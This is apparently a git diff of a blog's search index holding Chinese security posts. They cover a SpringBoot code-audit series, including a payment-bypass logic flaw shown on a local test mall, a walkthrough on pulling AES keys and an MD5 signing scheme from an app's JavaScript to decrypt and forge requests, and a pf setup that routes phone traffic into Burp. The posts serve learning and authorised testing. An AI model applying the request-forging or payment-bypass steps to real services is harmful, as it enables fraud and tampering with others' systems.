+<p><code>application.properties</code>: Spring Boot默认配置文件</p>
+<p>非该项目，但可能存在的文件：</p>
+<p><code>META-INF/</code>: 相当于一个信息包，目录中的文件和目录获得Java 2平台的认可与解释，用来配置应用程序、扩展程序、类加载器和服务</p>
+<p><code>i18n/</code>: 国际化文件的简称，来源是英文单词internationalization的首末字符i和n，18为中间的字符数</p>
+<h2 id="其他结构"><a href="#其他结构" class="headerlink" title="其他结构"></a>其他结构</h2><p>⚠️ Spring Boot无需配置 <code>web.xml</code>，但在其他Java项目中，<code>web.xml</code>是一个非常重要的文件，用来配置Servlet、Filter、Listener等。</p>
+<p><code>pom.xml</code>: maven的配置文件，记录项目信息、依赖信息、构建配置等</p>
+<p>如果使用gradle进行自动化构建，则会存在<code>build.gradle</code>文件</p>
+<h1 id="请求传递流程"><a href="#请求传递流程" class="headerlink" title="请求传递流程"></a>请求传递流程</h1><p>Java审计难上手的一大因素是Java一般都是大中型系统，架构相比于PHP开发的小系统会复杂很多，大型系统开发过程中难免出现不规范的编码习惯，再加上函数调用错综复杂，审计代码时光弄明白程序逻辑，理解程序员的编码习惯就要花费大量精力了。</p>
+<p>首先弄明白请求流程的处理，知道用户请求内容会经过哪些代码才能理解程序处理逻辑，可以对我们后续的审计提供非常大的帮助。</p>
+<p>用户的请求发送给服务器之后，中间件（案例项目使用的是Tomcat）会将请求解析发送给Spring的<code>DispatcherServlet</code>，<code>DispatcherServlet</code>的作用是分配请求，详细的过程我们暂时不深入。只需要知道中间件解析请求之后请求会经过Filter和Interceptor。Filter（过滤器）和Interceptor（拦截器）做的事很相似，但他们的触发时机不同，且Interceptor只在Spring中生效，它们可以用来对请求进行过滤字符、拦截、鉴权、日志记录等功能，简单说就是可以在参数进入应用前对其处理，做到全局的处理。</p>
+<p>请求经过Filter和Interceptor之后会被<code>DispatcherServlet</code>分配到对应路径的Controller（控制器），文件名为<code>ExampleController</code>，Controller负责简单的逻辑处理和参数校验功能，之后调用Service。</p>
+<p>Service主要负责业务模块逻辑处理。Service层中有两种类，一是接口类，文件名为<code>ExampleService</code>，用来声明接口；二是接口实现类，文件名为<code>ExampleServiceImpl</code>，作为实现类实现接口中的方法。实现的代码都在<code>ExampleServiceImpl</code>中。当Service涉及到数据库操作时就会调用Dao。</p>
+<p>Dao主要负责数据库的操作，由于使用Mybatis作为ORM框架，只做中间传递的作用，所有SQL语句都是写在配置文件中的，配置文件名为<code>ExampleMapper.xml</code>，存放在<code>src/main/resources/mapper</code>中。</p>
+<p>从用户请求到服务器处理的主要过程如下图所示（省略了<code>DispatcherServlet</code>）：</p>
+<img src="/2020/04/26/JavaSpringBootCodeAudit-2-SpringBoot/request-path.png" alt="request-path" style="zoom:50%;">
+
+
+
+<p>为了更好理解，以「保存订单」功能为例，主要的请求流程如下图，不了解Spring请求传递的同学可以在代码中跟一遍请求流程，会加深请求传递的印象。</p>
+<img src="/2020/04/26/JavaSpringBootCodeAudit-2-SpringBoot/request-example.png" alt="request-example" style="zoom:50%;">]]></content>
   </entry>
   <entry>
     <title>Java SpringBoot框架代码审计三 - SQL注入</title>
@@ -538,157 +767,6 @@
 <p><a href="https://segmentfault.com/a/1190000004617028" target="_blank" rel="noopener">https://segmentfault.com/a/1190000004617028</a></p>
 <p><a href="https://c0d3p1ut0s.github.io/MyBatis框架中常见的SQL注入/" target="_blank" rel="noopener">https://c0d3p1ut0s.github.io/MyBatis%E6%A1%86%E6%9E%B6%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84SQL%E6%B3%A8%E5%85%A5/</a></p>
 ]]></content>
-  </entry>
-  <entry>
-    <title>通过JS解开加密传输</title>
-    <url>/2020/04/03/JS-Decrypt/</url>
-    <content><![CDATA[<h1 id="JS解密过程"><a href="#JS解密过程" class="headerlink" title="JS解密过程"></a>JS解密过程</h1><blockquote>
-<p>为了不泄漏信息，文章中存在打码，修改参数等脱敏措施，但解密的方法未变，可供参考。</p>
-</blockquote>
-<p>很多app传输会对报文进行加密，并存在防篡改的签名机制，导致不能修改参数进行渗透测试，对于我不熟悉app逆向的人来说逆向app的成本比较高，这里介绍一种比较便捷的解密方式，就是通过js来解密请求。前提是需要这个app存在h5页面，并且h5页面的加密算法和app本身的加密算法一致。</p>
-<p>某app的h5页面显示的链接是 <a href="https://app.xxx.com/function/#/pages/queryDetails?id=644626" target="_blank" rel="noopener">https://app.xxx.com/function/#/pages/queryDetails?id=644626</a> 这种类型的，URl中参数在<code>#</code>之后，这种样式的URL基本都是前后端分离的系统，也就是会通过JS会处理很多事务。</p>
-<a id="more"></a>
-
-<p>实际上在burp中抓包它的请求链接是 <a href="https://app.xxx.com/app/gateway/queryServices/011023?reqno=M4NofxiOtz4SvYpx" target="_blank" rel="noopener">https://app.xxx.com/app/gateway/queryServices/011023?reqno=M4NofxiOtz4SvYpx</a> 这样的。</p>
-<p><img src="/2020/04/03/JS-Decrypt/encrypt-request-data.jpg" alt="encrypt-request-data"></p>
-<p>测试过程中我的第一反应是尝试从js中将加解密方法找出来（虽然这个链接是app的，但是网页能访问，那它就一定是js加解密的，js加解密我个人认为比逆向app简单很多，而且也方便调试）。</p>
-<p>但有一点需要注意，前后端分离的系统，会对js压缩和混淆，一方面是减轻js的体量，另一方面能在一定程度上防止他人通过js分析出关键代码。所以在被压缩混淆的js中调试也还是有一定难度的。</p>
-<p>所幸网站的js很少，且大部分应用加密传输使用AES对报文进行加密，再使用RSA传输AES的密钥。</p>
-<p>随便找找就发现AES加密的js代码，在代码中发现加密方式是<code>CBC Pkcs7</code></p>
-<p>密钥o：<code>^BJSHGZ!@#ZZZDGJ</code>（密钥并不是这个，真实的密钥需要看变量n，数组arguments如果大于1，则使用arguments中的密钥，这个arguments具体是怎么来的我没搞懂，不过不重要，调试的时候我们能直接得到密钥的值，可以不用具体分析）</p>
-<p>偏移量iv：<code>0108489312380708</code></p>
-<p>AES加解密的过程如下图，还是比较清晰的。</p>
-<p><img src="/2020/04/03/JS-Decrypt/js-encrypt-code.png" alt="js-encrypt-code"></p>
-<p>下图是调试过程，密钥就直接拿到了：</p>
-<p><img src="/2020/04/03/JS-Decrypt/get-aes-key.png" alt="get-aes-key"></p>
-<p>⚠️ 这里有个js混淆的坑，对于不咋熟悉js的我，1824行 <code>u.default.encrypt</code>我还以为是另一种加密，在这里找这个是什么加密方法找了好久，结果它就是调用上图AES加密的方法，想太多了……</p>
-<p><img src="/2020/04/03/JS-Decrypt/aes-default-encrypt.jpg" alt="aes-default-encrypt"></p>
-<p>知道加解密方法，之后就可以尝试对参数进行修改了，同样是在调试过程，把参数取出，或者通过AES解密请求中的request body得到的请求参数，进行修改。</p>
-<p><img src="/2020/04/03/JS-Decrypt/unencrypt-request-body.png" alt="unencrypt-request-body"></p>
-<p>修改完成之后进行AES加密，我使用的是 <a href="https://gchq.github.io/CyberChef/" target="_blank" rel="noopener">https://gchq.github.io/CyberChef/</a> ，加密过程调成如下图：</p>
-<p><img src="/2020/04/03/JS-Decrypt/cyberchef-aes-encrypt.png" alt="cyberchef-aes-encrypt"></p>
-<p>request body的加密就到这了。response body解密使用的密钥，iv，模式，填充都一样，是逆过程就不多写了。</p>
-<p>最后一个重点就是修改签名，修改完request body之后的签名肯定就变化了，就需要跟随请求来修改签名。</p>
-<p>签名大概的算法如下图，不咋懂js的我刚看到这时是一脸的懵逼。</p>
-<p><img src="/2020/04/03/JS-Decrypt/js-add-sign.png" alt="js-add-sign"></p>
-<p>不过好在可以调试，通过调试可以看到算出Q所需要的参数，不过不用那么麻烦，直接看Q前一步就行了，<code>Q = (0, g.default) (D).toString()</code>，也就是查看D是什么</p>
-<p>通过调试可以知道，D是：（去除了\）</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">9924531585918379141792&#x2F;queryServices&#x2F;011023reqno&#x3D;M4NofxiOtz4SvYpx&#123;&quot;head&quot;:&#123;&quot;client&quot;:&quot;ABC&quot;,&quot;transactionno&quot;:&quot;72789911122233&quot;,&quot;transactiontype&quot;:&quot;lis&quot;,&quot;transactionexedate&quot;:&quot;2020-04-03&quot;,&quot;transactionexetime&quot;:&quot;01:26:29&quot;&#125;,&quot;body&quot;:&quot;120001111&quot;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>D是由M+T+B+S+x组成的，我们修改的只是请求参数，请求参数在x中，也就是说我们修改其他参数我们都不用改。直接在调试过程中得到的D中修改请求参数，再对D进行hash就得到了sign。</p>
-<p>⚠️ 确定签名算法中有一步就是因为hash方法弄错了导致浪费了很多时间，我在js代码中某处看到了sha1，我就以为hash方法是sha1，结果hash方法是md5…… Orz 怪不得我之前的加签都和结果对不上，还以为漏了算法中的某一步。</p>
-<p><img src="/2020/04/03/JS-Decrypt/debug-sign.png" alt="debug-sign"></p>
-<h1 id="实操环节"><a href="#实操环节" class="headerlink" title="实操环节"></a>实操环节</h1><p>访问网页，打开F12开发者工具，选择Debugger，点击index.js，在1522行和1835行下断点，</p>
-<p>然后复制n和iv的值</p>
-<p><img src="/2020/04/03/JS-Decrypt/debug-aes-key.png" alt="debug-aes-key"></p>
-<p>其他配置可参考下图，mode是CBC，padding是pkcs7（如果你的AES加解密没有pkcs7，选pkcs5也是一样的）</p>
-<p><img src="/2020/04/03/JS-Decrypt/cyberchef-set-aes-encrypt.png" alt="cyberchef-set-aes-encrypt"></p>
-<p>点击继续，跳到下一个断点，这里可以复制E的值，E就是request body的值（记得得去掉<code>\</code>）直接得到请求内容，然后修改它。再复制D（去掉<code>\</code>），同样在请求参数中修改它。</p>
-<p><img src="/2020/04/03/JS-Decrypt/debug-sign-2.jpg" alt="debug-sign-2"></p>
-<p>修改完成之后，将E的值进行AES加密作为新的request body，D的值进行md5，就能得到signature的值。此时就能对报文参数修改测试了。</p>
-<p><img src="/2020/04/03/JS-Decrypt/burp-request.png" alt="burp-request"></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>Java SpringBoot框架代码审计一 - 前期准备</title>
-    <url>/2020/04/25/JavaSpringBootCodeAudit-1-Preparation/</url>
-    <content><![CDATA[<p>本系列文章使用SpringBoot+Mybaits的小型商城作为本次代码审计的目标，项目地址：<a href="https://github.com/newbee-ltd/newbee-mall" target="_blank" rel="noopener">https://github.com/newbee-ltd/newbee-mall</a> </p>
-<p>SpringBoot+Mybatis这套架构使用较为广泛，相比于SpringMVC，SpringBoot简化了很多配置，更易上手使用。并且该项目属于小型系统，程序逻辑较为简单，作者编码规范，搭建也非常方便，只需要配置数据库（MySQL）和商品图片资源，SpringBoot自带中间件，无需额外配置中间件，方便调试，代码中没看懂的逻辑，下断点上手调试非常便捷，非常适合新手入门代码审计。</p>
-<a id="more"></a>
-
-<h1 id="代码配置"><a href="#代码配置" class="headerlink" title="代码配置"></a>代码配置</h1><p>从项目地址：<a href="https://github.com/newbee-ltd/newbee-mall" target="_blank" rel="noopener">https://github.com/newbee-ltd/newbee-mall</a> 下载代码，在IntelliJ IDEA中导入<code>pom.xml</code>，IDEA会以maven项目打开并自动下载依赖包。</p>
-<p>Spring属性文件路径：<code>/src/main/resources/application.properties</code>，其中可修改端口和mysql数据库地址</p>
-<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="meta">server.port</span>=<span class="string">8089</span></span><br><span class="line"><span class="attr">...</span></span><br><span class="line"><span class="meta">spring.datasource.url</span>=<span class="string">jdbc:mysql://localhost:3306/newbee_mall_db?...</span></span><br></pre></td></tr></table></figure>
-
-
-
-<p>配置文件路径：<code>/src/main/java/ltd/newbee/mall/config/NeeBeeMallWebMvcConfigurer.java</code>，其中配置了图片路径</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addResourceHandlers</span><span class="params">(ResourceHandlerRegistry registry)</span> </span>&#123;</span><br><span class="line">    registry.addResourceHandler(<span class="string">"/upload/**"</span>).addResourceLocations(<span class="string">"file:"</span> + Constants.FILE_UPLOAD_DIC);</span><br><span class="line">    registry.addResourceHandler(<span class="string">"/goods-img/**"</span>).addResourceLocations(<span class="string">"file:"</span> + Constants.FILE_UPLOAD_DIC);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>此时是没有测试数据的，需要将<code>/src/main/resources/upload.zip</code>压缩包中的测试商品数据解压出来，放到任意的目录中。此处作为学习测试使用，可以直接解压在当前路径下，正式系统中一定要存放在非项目路径下。</p>
-<p>在文件<code>src/main/java/ltd/newbee/mall/common/Constants.java</code>中，变量<code>FILE_UPLOAD_DIC</code>为当前上传图片路径，将其更改为我们解压<code>upload.zip</code>的<strong>绝对</strong>路径</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Constants</span> </span>&#123;</span><br><span class="line">    <span class="comment">//上传文件的默认url前缀，根据部署设置自行修改</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> String FILE_UPLOAD_DIC = <span class="string">"/some_path/src/main/resources/upload/"</span>;</span><br><span class="line">    <span class="comment">//public final static String FILE_UPLOAD_DIC = "D:\\upload\\";//上传文件的默认url前缀，根据部署设置自行修改</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h1 id="MySQL数据库配置"><a href="#MySQL数据库配置" class="headerlink" title="MySQL数据库配置"></a>MySQL数据库配置</h1><p>过程中使用docker来快速搭建测试所需的数据库，docker方便更改测试过程中使用到的各组件版本，并且测试结束后可删除容器而不对本地环境造成任何影响。</p>
-<p>使用其他方法安装mysql数据库也行，记得要在配置文件中更改mysql地址。代码部署在docker内也是可以的，不过考虑调试方便，还是建议直接本地运行代码，有远程调试经验的同学可以尝试将代码一同布置在docker内。</p>
-<p>拉取mysql（latest为最新版本，需要其他版本可将lastest改为具体版本号即可）</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull mysql:latest</span><br></pre></td></tr></table></figure>
-
-<p>运行（因为仅作为测试环境，并且在容器里，所以将mysql密码设置为简单密码，非测试环境慎重）</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -itd --name mysql -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 mysql</span><br></pre></td></tr></table></figure>
-
-<p>进入容器，确定MySQL正常运行</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it mysql /bin/bash</span><br><span class="line"></span><br><span class="line">root@815203ed6f5a:/<span class="comment"># mysql -u root -p</span></span><br><span class="line">Enter password: 123456</span><br><span class="line">mysql&gt; select @@version;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/04/25/JavaSpringBootCodeAudit-1-Preparation/mysql-version.png" alt="mysql-version"></p>
-<p>另起一个终端，将sql文件复制到容器内（8d3b6661cdd2是容器ID）</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker cp /some_path/newbee-mall/src/main/resources/newbee_mall_schema.sql 815203ed6f5a:/root</span><br></pre></td></tr></table></figure>
-
-<p>回到容器，建立数据库（如果这里更改了数据库名，需要同时修改<code>application.properties</code>中mysql连接的数据库名）</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root:/<span class="comment"># mysql -u root -p</span></span><br><span class="line">mysql&gt; create database newbee_mall_db；</span><br><span class="line">mysql&gt; <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
-
-<p>执行sql文件</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root:/<span class="comment"># mysql -u root -p newbee_mall_db&lt;/root/newbee_mall_schema.sql</span></span><br></pre></td></tr></table></figure>
-
-<p>进行简单的数据库查询，校验是否成功导入SQL。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; use newbee_mall_db;</span><br><span class="line">mysql&gt; select * from tb_newbee_mall_admin_user;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/04/25/JavaSpringBootCodeAudit-1-Preparation/mysql-import-sql.png" alt="mysql-import-sql"></p>
-<p>看到能成功查询我们导入的SQL，配置成功～（中文字符没显示出来，被<code>?</code>代替）</p>
-<h1 id="启动项目"><a href="#启动项目" class="headerlink" title="启动项目"></a>启动项目</h1><p>以上步骤完成后，在IntelliJ IDEA中运行项目，访问在<code>application.properties</code>中配置的端口就能看到项目。</p>
-<p><img src="/2020/04/25/JavaSpringBootCodeAudit-1-Preparation/run-application.png" alt="run-application"></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>Java SpringBoot框架代码审计二 - Spring Boot项目结构介绍</title>
-    <url>/2020/04/26/JavaSpringBootCodeAudit-2-SpringBoot/</url>
-    <content><![CDATA[<h1 id="Spring-Boot项目结构"><a href="#Spring-Boot项目结构" class="headerlink" title="Spring Boot项目结构"></a>Spring Boot项目结构</h1><p>一个简单Spring Boot项目的目录结构如下图</p>
-<img src="/2020/04/26/JavaSpringBootCodeAudit-2-SpringBoot/springboot-directory.png" alt="springboot-directory" style="zoom:33%;">
-
-<a id="more"></a>
-
-<p>Java代码都在<code>src/main/java/</code>目录下，<code>src/main/resources/</code>中放置资源文件。</p>
-<h2 id="代码结构"><a href="#代码结构" class="headerlink" title="代码结构"></a>代码结构</h2><p><code>common/</code>: 存放通用类，如工具类和通用返回结果</p>
-<p><code>config/</code>: 存放配置文件</p>
-<p><code>controller/</code>: 存放控制器，接收从前端传来的参数，对访问控制进行转发、各类基本参数校验或者不复用的业务简单处理等。</p>
-<p><code>dao/</code>: 数据访问层，与数据库进行交互，负责数据库操作，在Mybaits框架中存放自定义的Mapper接口</p>
-<p><code>entity/</code>: 存放实体类</p>
-<p><code>interceptor/</code>: 拦截器</p>
-<p><code>service/</code>: 存放服务类，负责业务模块逻辑处理。<code>Service</code>层中有两种类，一是<code>Service</code>，用来声明接口；二是<code>ServiceImpl</code>，作为实现类实现接口中的方法。</p>
-<p><code>utils/</code>: 存放工具类</p>
-<p><code>NewBeeMallApplication.java</code>: Spring Boot启动类</p>
-<p>非该项目，但可能存在的文件夹：</p>
-<p><code>dto/</code>:  存放数据传输对象（Data Transfer Object），如请求参数和返回结果</p>
-<p><code>vo/</code>:  视图对象（View Object）用于封装客户端请求的数据，防止部分数据泄漏，保证数据安全</p>
-<p><code>constant/</code>:  存放常量</p>
-<p><code>filter/</code>: 存放过滤器</p>
-<p><code>component/</code>: 存放组件</p>
-<h2 id="资源目录结构"><a href="#资源目录结构" class="headerlink" title="资源目录结构"></a>资源目录结构</h2><p>在<code>src/main/resources</code>下存放资源文件</p>
-<p><code>mapper/</code>: 存放Mybaits的mapper.xml文件</p>
-<p><code>static/</code>: 静态资源文件目录（Javascript、CSS、图片等），在这个目录中的所有文件可以被直接访问</p>
-<p><code>templates/</code>: 存放模版文件</p>
-<p><code>application.properties</code>: Spring Boot默认配置文件</p>
-<p>非该项目，但可能存在的文件：</p>
-<p><code>META-INF/</code>: 相当于一个信息包，目录中的文件和目录获得Java 2平台的认可与解释，用来配置应用程序、扩展程序、类加载器和服务</p>
-<p><code>i18n/</code>: 国际化文件的简称，来源是英文单词internationalization的首末字符i和n，18为中间的字符数</p>
-<h2 id="其他结构"><a href="#其他结构" class="headerlink" title="其他结构"></a>其他结构</h2><p>⚠️ Spring Boot无需配置 <code>web.xml</code>，但在其他Java项目中，<code>web.xml</code>是一个非常重要的文件，用来配置Servlet、Filter、Listener等。</p>
-<p><code>pom.xml</code>: maven的配置文件，记录项目信息、依赖信息、构建配置等</p>
-<p>如果使用gradle进行自动化构建，则会存在<code>build.gradle</code>文件</p>
-<h1 id="请求传递流程"><a href="#请求传递流程" class="headerlink" title="请求传递流程"></a>请求传递流程</h1><p>Java审计难上手的一大因素是Java一般都是大中型系统，架构相比于PHP开发的小系统会复杂很多，大型系统开发过程中难免出现不规范的编码习惯，再加上函数调用错综复杂，审计代码时光弄明白程序逻辑，理解程序员的编码习惯就要花费大量精力了。</p>
-<p>首先弄明白请求流程的处理，知道用户请求内容会经过哪些代码才能理解程序处理逻辑，可以对我们后续的审计提供非常大的帮助。</p>
-<p>用户的请求发送给服务器之后，中间件（案例项目使用的是Tomcat）会将请求解析发送给Spring的<code>DispatcherServlet</code>，<code>DispatcherServlet</code>的作用是分配请求，详细的过程我们暂时不深入。只需要知道中间件解析请求之后请求会经过Filter和Interceptor。Filter（过滤器）和Interceptor（拦截器）做的事很相似，但他们的触发时机不同，且Interceptor只在Spring中生效，它们可以用来对请求进行过滤字符、拦截、鉴权、日志记录等功能，简单说就是可以在参数进入应用前对其处理，做到全局的处理。</p>
-<p>请求经过Filter和Interceptor之后会被<code>DispatcherServlet</code>分配到对应路径的Controller（控制器），文件名为<code>ExampleController</code>，Controller负责简单的逻辑处理和参数校验功能，之后调用Service。</p>
-<p>Service主要负责业务模块逻辑处理。Service层中有两种类，一是接口类，文件名为<code>ExampleService</code>，用来声明接口；二是接口实现类，文件名为<code>ExampleServiceImpl</code>，作为实现类实现接口中的方法。实现的代码都在<code>ExampleServiceImpl</code>中。当Service涉及到数据库操作时就会调用Dao。</p>
-<p>Dao主要负责数据库的操作，由于使用Mybatis作为ORM框架，只做中间传递的作用，所有SQL语句都是写在配置文件中的，配置文件名为<code>ExampleMapper.xml</code>，存放在<code>src/main/resources/mapper</code>中。</p>
-<p>从用户请求到服务器处理的主要过程如下图所示（省略了<code>DispatcherServlet</code>）：</p>
-<img src="/2020/04/26/JavaSpringBootCodeAudit-2-SpringBoot/request-path.png" alt="request-path" style="zoom:50%;">
-
-
-
-<p>为了更好理解，以「保存订单」功能为例，主要的请求流程如下图，不了解Spring请求传递的同学可以在代码中跟一遍请求流程，会加深请求传递的印象。</p>
-<img src="/2020/04/26/JavaSpringBootCodeAudit-2-SpringBoot/request-example.png" alt="request-example" style="zoom:50%;">]]></content>
   </entry>
   <entry>
     <title>Java SpringBoot框架代码审计四 - XSS</title>
@@ -878,44 +956,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>使用Packet Filter将Mac热点中的流量转发到Burp</title>
-    <url>/2020/04/02/Macbook_Hotspot_Proxy_to_Burp/</url>
-    <content><![CDATA[<p>一般情况下，Burp抓手机APP的HTTP/HTTPS请求时可在系统代理或者VPN代理软件上设置代理服务器，但是部分APP存在代理检测，发现存在代理则退出应用，或是部分APP的请求不通过代理。此时可利用Packet Filter将手机流量转发到Burp代理上，避免以上情况发生，从而抓到请求包。</p>
-<a id="more"></a>
-
-<p>使用步骤：</p>
-<ol>
-<li>打开Macbook的网络共享，iPhone连接Macbook共享的网络（热点）。</li>
-<li>打开Burp，监听本地端口，并打开<code>Support invisible proxying</code>选项。</li>
-</ol>
-<img src="/2020/04/02/Macbook_Hotspot_Proxy_to_Burp/check-support-invisible-proxying.png" alt="check-support-invisible-proxying" style="zoom:35%;">
-
-<ol start="3">
-<li><p>开启转发功能：<code>sudo sysctl -w net.inet.ip.forwarding=1</code></p>
-</li>
-<li><p>添加<code>/etc/pf.anchors/proxy.rules</code>文件，内容如下：</p>
-</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rdr pass on bridge100 inet proto tcp from any to any -&gt; 127.0.0.1 port 8080</span><br><span class="line"></span><br><span class="line"># rdr pass on bridge100 inet proto tcp from any to any port 80 -&gt; 127.0.0.1 port 8080</span><br><span class="line"># rdr pass on bridge100 inet proto tcp from any to any port 443 -&gt; 127.0.0.1 port 8080</span><br></pre></td></tr></table></figure>
-
-<ol start="5">
-<li>添加<code>/etc/pf-minor.conf</code>文件，内容如下：</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rdr-anchor &quot;forwarding&quot;</span><br><span class="line">load anchor &quot;forwarding&quot; from &quot;&#x2F;etc&#x2F;pf.anchors&#x2F;proxy.rules&quot;</span><br></pre></td></tr></table></figure>
-
-<ol start="6">
-<li>执行：<code>sudo pfctl -evf /etc/pf-minor.conf</code></li>
-</ol>
-<img src="/2020/04/02/Macbook_Hotspot_Proxy_to_Burp/pfctl.png" alt="pfctl" style="zoom:40%;">
-
-
-
-<p>⚠️：还原设定时只需执行：<code>sudo pfctl -evf /etc/pf.conf</code>，并且重启热点</p>
-<p><code>sudo pfctl -d</code>关闭packet filter</p>
-<p>总结：本质上是通过防火墙将某张网卡的流量转发到Burp。在Linux和Windows操作系统中配合防火墙进行流量转发能得到同样的效果。</p>
-]]></content>
-  </entry>
-  <entry>
     <title>Java SpringBoot框架代码审计六 - CSRF</title>
     <url>/2020/05/05/JavaSpringBootCodeAudit-6-CSRF/</url>
     <content><![CDATA[<p>CSRF真正和代码相关的内容不太多，主要还是看过滤器和拦截器。代码审计中的思路是检查是否校验Referer、是否给cookie设置SameSite属性和敏感操作是否会生成CSRF token，如果都不存在再查看请求参数中是否存在不可被攻击者猜测的字段，比如验证码等参数。</p>
@@ -967,6 +1007,70 @@
 <p><a href="https://blog.csdn.net/junmoxi/article/details/89208311" target="_blank" rel="noopener">https://blog.csdn.net/junmoxi/article/details/89208311</a></p>
 <p><a href="https://www.cnblogs.com/volcano-liu/p/11301057.html" target="_blank" rel="noopener">https://www.cnblogs.com/volcano-liu/p/11301057.html</a></p>
 <p><a href="https://stackoverflow.com/questions/42998367/same-site-cookie-in-spring-security/43250133#43250133" target="_blank" rel="noopener">https://stackoverflow.com/questions/42998367/same-site-cookie-in-spring-security/43250133#43250133</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>Java SpringBoot框架代码审计七 - 逻辑漏洞</title>
+    <url>/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/</url>
+    <content><![CDATA[<p>逻辑漏洞不像之前介绍的漏洞有一套固定的审计流程，每个逻辑漏洞背后的代码都不一样。通过纯白盒去找逻辑漏洞是比较费劲的，首先需要彻底了解业务，再带着各种疑问和奇怪的想法去审。</p>
+<a id="more"></a>
+
+<h1 id="逻辑漏洞代码审计过程"><a href="#逻辑漏洞代码审计过程" class="headerlink" title="逻辑漏洞代码审计过程"></a>逻辑漏洞代码审计过程</h1><p>用户正常的购物过程是<code>添加购物车-&gt;下单-&gt;付款-&gt;出库-&gt;交易成功</code>，但程序在购物过程中没有对前一步进行校验。下订单但未支付时，访问<code>/orders/{orderNo}/finish</code>可直接完成交易。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// /src/main/java/ltd/newbee/mall/controller/mall/OrderController.java</span></span><br><span class="line"><span class="meta">@PutMapping</span>(<span class="string">"/orders/&#123;orderNo&#125;/finish"</span>)</span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Result <span class="title">finishOrder</span><span class="params">(@PathVariable(<span class="string">"orderNo"</span>)</span> String orderNo, HttpSession httpSession) </span>&#123;</span><br><span class="line">    NewBeeMallUserVO user = (NewBeeMallUserVO) httpSession.getAttribute(Constants.MALL_USER_SESSION_KEY);</span><br><span class="line">    String finishOrderResult = newBeeMallOrderService.finishOrder(orderNo, user.getUserId());</span><br><span class="line">    <span class="keyword">if</span> (ServiceResultEnum.SUCCESS.getResult().equals(finishOrderResult)) &#123;</span><br><span class="line">        <span class="keyword">return</span> ResultGenerator.genSuccessResult();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ResultGenerator.genFailResult(finishOrderResult);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>从代码中可以看到直接调用<code>newBeeMallOrderService.finishOrder(orderNo, user.getUserId())</code>，对于该订单是否支付，是否出库等过程都没有校验。</p>
+<h1 id="实际测试"><a href="#实际测试" class="headerlink" title="实际测试"></a>实际测试</h1><p>随便添加一件物品到购物车，提交订单</p>
+<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/submit-order.png" alt="submit-order"></p>
+<p>此时来到订单详情页面，按正常逻辑来下一步是付款操作</p>
+<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/pay-order.png" alt="pay-order"></p>
+<p>在管理页面确认该订单当前状态是待支付</p>
+<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/wait-for-payment.png" alt="wait-for-payment"></p>
+<p>使用PUT方法访问<code>http://localhost:8089/orders/15886680589866584/finish</code>即可直接完成订单</p>
+<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/bypass-pay-order.png" alt="bypass-pay-order"></p>
+<p>因为代码使用的是<code>@PutMapping</code>，所以只能使用PUT方法访问，其他请求方法不会被执行</p>
+<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/finishOrder.png" alt="finishOrder"></p>
+<p>再次查看订单，已经交易成功</p>
+<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/paid-success.png" alt="paid-success"></p>
+<p>在管理页面查看该订单，证明交易成功。</p>
+<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/show-orders.png" alt="show-orders"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>使用Packet Filter将Mac热点中的流量转发到Burp</title>
+    <url>/2020/04/02/Macbook_Hotspot_Proxy_to_Burp/</url>
+    <content><![CDATA[<p>一般情况下，Burp抓手机APP的HTTP/HTTPS请求时可在系统代理或者VPN代理软件上设置代理服务器，但是部分APP存在代理检测，发现存在代理则退出应用，或是部分APP的请求不通过代理。此时可利用Packet Filter将手机流量转发到Burp代理上，避免以上情况发生，从而抓到请求包。</p>
+<a id="more"></a>
+
+<p>使用步骤：</p>
+<ol>
+<li>打开Macbook的网络共享，iPhone连接Macbook共享的网络（热点）。</li>
